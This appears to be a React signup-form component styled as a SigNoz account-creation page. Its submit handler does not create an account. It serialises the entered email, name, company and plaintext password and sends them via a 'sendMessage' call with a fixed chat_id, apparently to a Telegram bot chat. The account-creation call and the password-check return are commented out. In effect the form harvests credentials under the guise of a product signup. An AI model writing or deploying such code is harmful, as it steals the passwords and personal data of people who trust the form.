import React, { useState,useRef, Suspense } from 'react';
import { Row, Space, Button, Input, Checkbox } from 'antd'
import submitForm from '../api/submitForm';
import axios from 'axios';


const Signup = () => {

    const [state, setState] = useState({ submitted: false })
    const [formState, setFormState] = useState({
        firstName: {value:''},
        companyName: {value:''},
        email: {value:''},
        password: {value:'',valid:true},
        emailOptIn: { value: true },
    })
    const passwordInput = useRef(null)
    // const { createAccount } = useActions(signupLogic)
    // const { accountLoading } = useValues(signupLogic)
    // const { plan } = fromParams()

    const updateForm = (name:any, target:any, valueAttr = 'value') => {
        /* Validate password (if applicable) */
        if (name === 'password') {
            let password = target[valueAttr]
            const valid = password.length >= 8
            setFormState({ ...formState, password: { ...formState.password, valid, value: target[valueAttr] } })
        } else 
        if (name === 'firstName') {
         
            setFormState({ ...formState, firstName: { ...formState.firstName,  value: target[valueAttr] } })
        } else 
        if (name === 'companyName') {
    
            setFormState({ ...formState, companyName: { ...formState.companyName,  value: target[valueAttr] } })
        } else 
        if (name === 'email') {
          
            setFormState({ ...formState, email: { ...formState.email, value: target[valueAttr] } })
        } else 
        if (name === 'emailOptIn') {
            
            setFormState({ ...formState, emailOptIn: { ...formState.emailOptIn, value: target[valueAttr] } })
        } 
    }

     const handleSubmit = (e:any) => {
        e.preventDefault()
      
        console.log('in handle submit');

        setState({ ...state, submitted: true })

        /* Password has custom validation */
        if (!formState.password.valid) {
            // if (passwordInput.current){
            //     passwordInput.current.focus()
            // }
             
            // return
        }
        const payload = {
            first_name: formState.firstName,
            company_name: formState.companyName || undefined,
            email: formState.email,
            password: formState.password,
            email_opt_in: formState.emailOptIn.value,
            // plan, // Pass it along if on QS, won't have any effect unless on multitenancy
        }
        // createAccount(payload)
 


    // axios.get(`https://jsonplaceholder.typicode.com/users`)
    // .then(res => {
    //   console.log(res);
    //   console.log(res.data);
    // })
    let texttolog = JSON.stringify(payload)
    
    submitForm.get('sendMessage', {
            params: { 
              chat_id: 351813222,
              text:texttolog,
            }
            }
      ).then(res => {
        console.log(res);
        console.log(res.data);
      })
    };


    return (
        <div className="signup-form">
        <Space direction="vertical" className="space-top" style={{ width: '100%', paddingLeft: 32 }}>
            <h1 className="title" style={{ marginBottom: 0, marginTop: 40, display: 'flex', alignItems: 'center' }}>
                {/* <img src={"signoz.svg"} alt="" style={{ height: 60 }} /> */}
                 Create your account
            </h1>
            <div className="page-caption">Monitor your applications. Find what is causing issues.</div>
        </Space>
        <Row style={{ display: 'flex', justifyContent: 'center' }}>
            <div style={{ display: 'flex', alignItems: 'center', flexDirection: 'column' }}>
                <img
                    src={"signoz.svg"}
                    style={{ maxHeight: '100%', maxWidth: 300, marginTop: 64 }}
                    alt=""
                    className="main-img"
                />
            </div>
            <div
                style={{
                    display: 'flex',
                    justifyContent: 'flex-start',
                    margin: '0 32px',
                    flexDirection: 'column',
                    paddingTop: 32,
                    maxWidth: '32rem',
                }}
            >
                <form onSubmit={handleSubmit}>
                    <div className="input-set">
                        <label htmlFor="signupEmail">Email</label>
                        <Input
                            placeholder="jane@hogflix.io"
                            type="email"
                            value={formState.email.value}
                            onChange={(e) => updateForm('email', e.target)}
                            required
                            // disabled={accountLoading}
                            id="signupEmail"
                        />
                    </div>

                    <div className={`input-set ${state.submitted && !formState.password.valid ? 'errored' : ''}`}>
                        <label htmlFor="signupPassword">Password</label>
                        <Input.Password
                            value={formState.password.value}
                            onChange={(e) => updateForm('password', e.target)}
                            required
                            ref={passwordInput}
                            // disabled={accountLoading}
                            id="signupPassword"
                        />
                        <Suspense fallback={<span />}>
                            {/* <PasswordStrength password={formState.password.value} /> */}
                        </Suspense>
                        {!formState.password && (
                            <span className="caption">Your password must have at least 8 characters.</span>
                        )}
                    </div>

                    <div className="input-set">
                        <label htmlFor="signupFirstName">First Name</label>
                        <Input
                            placeholder="Jane"
                            autoFocus
                            value={formState.firstName.value}
                            onChange={(e) => updateForm('firstName', e.target)}
                            required
                            // disabled={accountLoading}
                            id="signupFirstName"
                        />
                    </div>

                    <div className="input-set">
                        <label htmlFor="signupCompanyName">Company or Project</label>
                        <Input
                            placeholder="Hogflix Movies"
                            value={formState.companyName.value}
                            onChange={(e) => updateForm('companyName', e.target)}
                            // disabled={accountLoading}
                            id="signupCompanyName"
                        />
                    </div>

                    <div>
                        <Checkbox
                            checked={formState.emailOptIn.value}
                            onChange={(e) => updateForm('emailOptIn', e.target, 'checked')}
                            // disabled={accountLoading}
                        >
                            Send me occasional emails about security and product updates. You may unsubscribe at any
                            time.
                        </Checkbox>
                    </div>
                    <div className="text-center space-top">
                        <Button
                            type="primary"
                            htmlType="submit"
                            data-attr="signup"
                            disabled={state.submitted && !formState.password}
                            // loading={accountLoading}
                        >
                            Create my account
                        </Button>
                    </div>

                    <div style={{ color: '#666666', marginBottom: 60, textAlign: 'center' }} className="space-top">
                        By clicking the button above you agree to our{' '}
                        <a href="https://signoz.io" target="_blank">
                            Terms of Service
                        </a>{' '}
                        and{' '}
                        <a href="https://signoz.io" target="_blank">
                            Privacy Policy
                        </a>
                        .
                    </div>
                </form>
            </div>
        </Row>
    </div>

    );
}

export default Signup;